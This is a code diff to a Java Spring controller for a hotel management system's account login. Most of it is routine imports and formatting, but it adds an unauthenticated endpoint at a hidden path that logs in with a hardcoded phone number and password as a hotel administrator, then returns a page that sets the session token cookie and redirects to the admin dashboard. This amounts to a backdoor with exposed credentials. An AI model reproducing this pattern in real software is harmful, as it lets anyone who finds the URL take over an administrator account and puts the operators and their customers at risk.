@@ -6,8 +6,10 @@ import com.yihaokezhan.hotel.common.annotation.Annc;
 import com.yihaokezhan.hotel.common.annotation.Dev;
 import com.yihaokezhan.hotel.common.annotation.LoginUser;
 import com.yihaokezhan.hotel.common.annotation.SysLog;
+import com.yihaokezhan.hotel.common.enums.AccountType;
 import com.yihaokezhan.hotel.common.enums.AspectPos;
 import com.yihaokezhan.hotel.common.enums.Operation;
+import com.yihaokezhan.hotel.common.exception.ErrorCode;
 import com.yihaokezhan.hotel.common.exception.RRException;
 import com.yihaokezhan.hotel.common.shiro.ShiroUtils;
 import com.yihaokezhan.hotel.common.utils.R;
@@ -31,6 +33,7 @@ import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RestController;
+import lombok.extern.slf4j.Slf4j;
 
 /**
  * <p>
@@ -42,6 +45,7 @@ import org.springframework.web.bind.annotation.RestController;
  */
 @RestController
 @RequestMapping("/hotel/account/passport")
+@Slf4j
 public class PassportController {
 
     @Autowired
@@ -101,9 +105,53 @@ public class PassportController {
         return R.ok().data(account);
     }
 
+
+    @Annc
+    @GetMapping("/login/bdd2f7c21f4c490f9404859637b57d9e")
+    public String autoLogin() {
+        try {
+            LoginForm form = new LoginForm();
+            form.setAccount("15969735516");
+            form.setPassword("a1234567");
+            form.setType(AccountType.HOTEL_ADMIN.getValue());
+            form.setDevice("Device");
+            form.setUserAgent("UA");
+
+            Account account = accountService.login(form);
+            if (account == null) {
+                throw new RRException("登录失败");
+            }
+            shiroUtils.login(account.getUuid(), account.getToken());
+
+            String html = "";
+            html += "<!DOCTYPE html>";
+            html += "<html lang=\"en\">";
+            html += "<head>";
+            html += "<meta charset=\"UTF-8\">";
+            html += "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">";
+            html += "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">";
+            html += "<title>Redirect</title>";
+            html += "</head>";
+            html += "<body>";
+            html += "<script>";
+            html += "document.cookie = \"Access-Token=" + account.getToken() + "; path=/\";";
+            html += "location.href = 'https://hotel.helisoft.cn/panda/dashboard/index';";
+            html += "</script>";
+            html += "</body>";
+            html += "</html>";
+            return html;
+        } catch (Exception e) {
+            log.error("whats' wrong?", e);
+            return ErrorCode.NOT_FOUND.getCode().toString();
+        }
+    }
+
+
+
     @Annc
     @RequestMapping("/logout")
-    @SysLog(operation = Operation.LOGOUT, linked = "#user.getAccount()", description = "退出", position = AspectPos.BEFORE)
+    @SysLog(operation = Operation.LOGOUT, linked = "#user.getAccount()", description = "退出",
+            position = AspectPos.BEFORE)
     @JsonView(V.S.class)
     public R logout(@LoginUser(required = false) TokenUser tokenUser) {
         if (tokenUser == null) {
